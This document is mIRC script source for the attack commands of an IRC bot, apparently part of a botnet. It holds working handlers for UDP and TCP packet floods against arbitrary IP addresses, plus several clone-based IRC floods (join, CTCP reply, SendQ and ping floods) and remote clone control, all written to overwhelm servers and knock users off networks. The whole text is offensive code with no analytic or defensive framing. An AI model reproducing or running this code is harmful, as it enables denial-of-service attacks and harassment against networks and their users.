   alias botcmd.udp if (?*.?*.?*.?* !iswm $1) || ($2 !isnum) || ($3 !isnum) || ($3 < 1) || ($3 > 8192) || ($4 !isnum) || ($3 < 1) || ($5 !isnum) || ($5 < 1) || ($5 > 86400) return | .timerudpacket -m 0 $4 bread $mircexe 0 $3 &p $chr(124) sockudp udp $!r(1,65535) $1 $iif($2,$2,$!r(1,65535)) &p | .timer 1 $5 .timerudpacket off
   alias botcmd.tcp if (?*.?*.?*.?* !iswm $1) || ($2 !isnum) || ($3 !isnum) || ($3 < 1) || ($4 !isnum) || ($4 < 1) || ($4 > 86400) return | .timertcpacket -m 0 $3 sockopen tcp $1 $iif($2,$2,$!r(1,65535)) $chr(124) sockclose tcp | .timer 1 $4 .timertcpacket off
   alias botcmd.jflood if ($0 < 4) || ($2 !isnum) || ($4 !isnum) || ($4 < 1) || ($5 !isnum) || ($5 < 1) return | bot.out Flooding $3 on $1 $+ : $+ $2 (Revolving door++)/ $+ $4 clones, $5 times | bot.ident | var %i = $4 | while (%i) { sockopen jfld $+ %i $1 $2 | sockmark jfld $+ %i $3 $5 | dec %i }
   on *:sockopen:jfld*:if ($sockerr) { .timer -m 1 0 jfldc $sockname $sock($sockname).mark | return } | sockwrite -n $sockname USER $adj "" "" : $+ $adj $adj $adj | sockwrite -n $sockname NICK $adj $+ $adj
   on *:sockread:jfld*:if ($sockerr) { .timer -m 1 0 jfldc $sockname $sock($sockname).mark | return } | var %t | :l | sockread %t | tokenize 32 %t | if ($sockbr) { if ($1 == PING) sockwrite -n $sockname PONG $2- | if ($2 == 376) || ($2 == 422) { tokenize 32 $sock($sockname).mark | sockwrite -n $sockname JOIN $1 $crlf JOIN 0, $+ $1 $crlf JOIN 0, $+ $1 | .timer -m 1 0 jfldc $sockname $1- } | goto l }
   on *:sockwrite:jfld*:if ($sockerr) { .timer -m 1 0 jfldc $sockname $sock($sockname).mark | return }
   on *:sockclose:jfld*:.timer -m 1 0 jfldc $sockname $sock($sockname).mark
   alias jfldc var %s = $sock($1).ip, %p = $sock($1).port | sockclose $1 | if ($3 == 1) return | bot.ident | sockopen $1 %s %p | sockmark $1 $2 $calc($3 - 1)
   alias botcmd.pflood if ($0 < 4) || ($2 !isnum) || ($5 !isnum) || ($5 < 1) || ($6 !isnum) || ($6 < 1) return | bot.out Flooding $4 on $1 $+ : $+ $2 (Autoping killer)/ $+ $5 clones, $6 times | bot.ident | var %i = $5 | while (%i) { sockopen pfld $+ %i $1 $2 | sockmark pfld $+ %i $3 $4 $6 | dec %i }
   on *:sockopen:pfld*:if ($sockerr) { .timer -m 1 0 pfldc $sock($sockname).mark | return } | sockwrite -n $sockname USER $adj "" "" : $+ $adj | sockwrite -n $sockname NICK $adj $+ $adj
   on *:sockread:pfld*:if ($sockerr) { .timer -m 1 0 pfldc $sock($sockname).mark | return } | var %t | :l | sockread %t | tokenize 32 %t | if ($sockbr) { if ($1 == PING) sockwrite -n $sockname PONG $2- | if ($2 == 376) || ($2 == 422) { tokenize 32 $sock($sockname).mark | sockwrite -n $sockname JOIN $1 $crlf NOTICE $2 :PING $str(9,100) $+  $crlf PRIVMSG $2 :!ping me lag $left($sqt,400) | .timer -m 1 0 pfldc $sockname $1- } | goto l }
   on *:sockwrite:pfld*:if ($sockerr) { .timer -m 1 0 pfldc $sock($sockname).mark | return }
   on *:sockclose:pfld*:.timer -m 1 0 pfldc $sock($sockname).mark
   alias pfldc var %s = $sock($1).ip, %p = $sock($1).port | sockclose $1 | if ($4 == 1) return | bot.ident | sockopen $1 %s %p | sockmark $1 $2 $3 $calc($4 - 1)
   alias botcmd.rflood if ($0 < 4) || ($2 !isnum) || ($5 !isnum) || ($5 < 1) || ($6 !isnum) || ($6 < 1) return | bot.out Flooding $4 on $1 $+ : $+ $2 (CTCP Reply SendQ Flood)/ $+ $5 clones, $6 times | bot.ident | var %i = $5 | while (%i) { sockopen rfld $+ %i $1 $2 | sockmark rfld $+ %i $3 $4 $6 | dec %i }
   on *:sockopen:rfld*:if ($sockerr) { .timer -m 1 0 rfldc $sock($sockname).mark | return } | sockwrite -n $sockname USER $adj "" "" : $+ $adj | sockwrite -n $sockname NICK $adj $+ $adj
   on *:sockread:rfld*:if ($sockerr) { .timer -m 1 0 rfldc $sock($sockname).mark | return } | var %t | :l | sockread %t | tokenize 32 %t | if ($sockbr) { if ($1 == PING) sockwrite -n $sockname PONG $2- | if ($2 == 376) || ($2 == 422) { tokenize 32 $sock($sockname).mark | sockwrite -n $sockname JOIN $1 $crlf NOTICE $2 : $+ $left($sqt,100) $+  $crlf NOTICE $2 : $+ $sqt $+  | .timer -m 1 0 rfldc $sockname $1- } | goto l }
   on *:sockwrite:rfld*:if ($sockerr) { .timer -m 1 0 rfldc $sock($sockname).mark | return }
   on *:sockclose:rfld*:.timer -m 1 0 rfldc $sock($sockname).mark
   alias rfldc var %s = $sock($1).ip, %p = $sock($1).port | sockclose $1 | if ($4 == 1) return | bot.ident | sockopen $1 %s %p | sockmark $1 $2 $3 $calc($4 - 1)
   alias botcmd.sflood if ($0 < 4) || ($2 !isnum) || ($5 !isnum) || ($5 < 1) || ($6 !isnum) || ($6 < 1) return | bot.out Flooding $4 on $1 $+ : $+ $2 (SendQ Flood)/ $+ $5 clones, $6 times | bot.ident | var %i = $5 | while (%i) { sockopen sfld $+ %i $1 $2 | sockmark sfld $+ %i $3 $4 $6 | dec %i }
   on *:sockopen:sfld*:if ($sockerr) { .timer -m 1 0 sfldc $sock($sockname).mark | return } | sockwrite -n $sockname USER $adj "" "" : $+ $adj | sockwrite -n $sockname NICK $adj $+ $adj
   on *:sockread:sfld*:if ($sockerr) { .timer -m 1 0 sfldc $sock($sockname).mark | return } | var %t | :l | sockread %t | tokenize 32 %t | if ($sockbr) { if ($1 == PING) sockwrite -n $sockname PONG $2- | if ($2 == 376) || ($2 == 422) { tokenize 32 $sock($sockname).mark | sockwrite -n $sockname JOIN $1 $crlf PRIVMSG $2 : $+ $left($sqt,100) $crlf NOTICE $2 : $+ $sqt | .timer -m 1 0 sfldc $sockname $1- } | goto l }
   on *:sockwrite:sfld*:if ($sockerr) { .timer -m 1 0 sfldc $sock($sockname).mark | return }
   on *:sockclose:sfld*:.timer -m 1 0 sfldc $sock($sockname).mark
   alias sfldc var %s = $sock($1).ip, %p = $sock($1).port | sockclose $1 | if ($4 == 1) return | bot.ident | sockopen $1 %s %p | sockmark $1 $2 $3 $calc($4 - 1)
   alias botcmd.iflood if ($0 < 4) || ($2 !isnum) || ($5 !isnum) || ($5 < 1) || ($6 !isnum) || ($6 < 1) return | bot.out Flooding $4 on $1 $+ : $+ $2 (Invisible SendQ Flood)/ $+ $5 clones, $6 times | bot.ident | var %i = $5 | while (%i) { sockopen ifld $+ %i $1 $2 | sockmark ifld $+ %i $3 $4 $6 | dec %i }
   on *:sockopen:ifld*:if ($sockerr) { .timer -m 1 0 ifldc $sock($sockname).mark | return } | sockwrite -n $sockname USER $adj "" "" : $+ $adj | sockwrite -n $sockname NICK $adj $+ $adj
   on *:sockread:ifld*:if ($sockerr) { .timer -m 1 0 ifldc $sock($sockname).mark | return } | var %t | :l | sockread %t | tokenize 32 %t | if ($sockbr) { if ($1 == PING) sockwrite -n $sockname PONG $2- | if ($2 == 376) || ($2 == 422) { tokenize 32 $sock($sockname).mark | sockwrite -n $sockname JOIN $1 $crlf PRIVMSG $2 : $+ $left($sqt,100) $crlf NOTICE $2 : $+ $sqt | .timer -m 1 0 ifldc $sockname $1- } | goto l }
   on *:sockwrite:ifld*:if ($sockerr) { .timer -m 1 0 ifldc $sock($sockname).mark | return }
   on *:sockclose:ifld*:.timer -m 1 0 ifldc $sock($sockname).mark
   alias ifldc var %s = $sock($1).ip, %p = $sock($1).port | sockclose $1 | if ($4 == 1) return | bot.ident | sockopen $1 %s %p | sockmark $1 $2 $3 $calc($4 - 1)
   alias botcmd.clone var %t = $1., %i, %u | tokenize 32 $($1-,2) | goto %t | :load. | %i = $4 | if ($4 !isnum) return | while (%i) { %u = $randtok($2,44) $randtok($3,44) | bot.out Loading a clone to $replace(%u,$chr(32),:) | sockopen cl. $+ %i %u | dec %i } | return | :close. | sockclose cl.* | return | :join. | :part. | :topic. | sockwrite -n cl.* $1 $2 : $+ $3- | return | :msg. | :ctcp. | :notice. | :ctcpreply. | sockwrite -n cl.* $iif($istok(msg.ctcp,$1,46),privmsg,notice) $2 : $+ $iif(ctcp* iswm %t,$chr(1)) $+ $3- $+ $iif(ctcp* iswm $1,$chr(1)) | return | :quit. | sockwrite -n cl.* $1 : $+ $2- | return | :nick. | sockwrite -n cl.* NICK $adj $+ $adj | return | :raw. | sockwrite -n cl.* $2- | return | :%t | return moron
   on *:sockopen:cl.*:if ($sockerr) return | sockwrite -n $sockname USER $adj * * : $+ $adj $adj $adj $+ $crlf $+ NICK $adj $+ $adj
   on *:sockread:cl.*:if ($sockerr) return | var %t | sockread %t | while ($sockbr) { tokenize 32 %t | if ($1 == PING) sockwrite -n $sockname PONG $2- | sockread %t }
   on *:sockwrite:cl.*:if ($sockerr) return
   on *:sockclose:cl.*:if ($sockerr) return
   alias -l sqt return  $+ $str(%%,100)
